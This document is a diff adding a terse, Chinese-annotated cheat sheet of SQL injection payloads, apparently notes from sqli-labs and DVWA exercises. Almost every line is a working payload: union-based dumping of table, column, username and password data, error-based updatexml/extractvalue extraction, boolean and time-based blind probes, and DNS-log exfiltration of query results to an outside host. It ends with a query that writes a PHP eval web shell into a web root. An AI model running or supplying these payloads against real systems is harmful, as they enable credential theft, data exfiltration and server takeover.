@@ -1,0 +1,111 @@
+
+id=1
+id=1'--+
+测试注入点
+
+
+1 order by 2#
+?id=2 union select 1,2,3 --+
+1 union select 1,database()#
+
+1 union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()#                        从所有的表里边找到这个库名里不重复的表名
+
+
+1union select1, group_concat(column_name) from information_schema.columns where table_name='表名' #               从所有的列名里边找到这个表名里不重复的列名
+                                            
+
+user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
+
+1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+
+
+
+
+less 1:
+(Select schema _name from information_schema.schemata limit 0,1)
+
+?id=-1' union select 1,2,(select group_concat(username,0x7e,password) from security.users) --+
+?id=' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
+?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata ) --+
+
+stormgroup_member
+
+错误注入判断：
+
+?id=1' and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+
+
+
+?id=1' and (select count(*) from information_schema.tables group by concat((select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)))--+
+
+ and extractvalue(1,concat(0x7e,(select user()),0x7e))--+
+
+ and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+' and updatexml(1,concat(0x7e,(select version())),1)#
+
+ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)--+
+
+referers 错误注入:
+' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1))#
+ ' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='referers' ),0x7e),1))#
+referers
+
+布尔盲注：
+
+and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e'--+
+
+
+
+left(database(),1)>'s'            截取前几位
+select user() regexp '^r'
+
+select user() like 'ro%'
+43.247.91.228:84/Less-8/?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1)like 'e%'--+
+
+
+and length(database())=n
+
+ascii(substr((select database()),1,1))=98
+
+and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115--+
+
+ord(mid((select user()),1,1))=114
+
+时间注入:
+?id=1' and if(left(user(),1)='i',0,sleep(3))--+
+Id=1' and sleep(10)
+and if(length(database())=4 , sleep(3), 1) --+ 正确就延迟，错误就不延时
+?id=1' and if(left(database(),1)='s' , sleep(3), 1) --+
+           and if(left(database(),8)='security' , sleep(3), 1) --+
+?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' , sleep(3), 1) --+
+                                                  第一个库的前几个
+
+
+dnslog注入
+
+?id=1' and if((select load_file(concat('\\\\',(select database()),'.hq87c4.ceye.io\\abc'))),1,0)--+
+
+select load_file(concat('\\\\',(select database()),'.hq87c4.ceye.io\\abc'))),1,1)--+
+
+
+/?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'. hq87c4.ceye.io\\abc'))),1,1)--+
+
+secquan.hq87c4.ceye.io
+
+
+
+?id=1 order by 测试回显
+?id =1 and 1=2 union select 1,2,3查看哪一行可注入语句
+
+
+?id=2 and exists(select * from admin)
+?id=2 and exists(select username from manage)
+?id=2 and exists (select id from manage where len(username)=8 and ID=1)
+
+id=1
+id=1'--+
+
+
+空格/**/ 等号like url编码 类型选择
+
+
+select '<?php @eval($_POST[19801]);?>'INTO OUTFILE 'C://Users//Administrator//Desktop//UPUPW_AP5.2-1510//UPUPW_AP5.2//htdocs//19801.php'
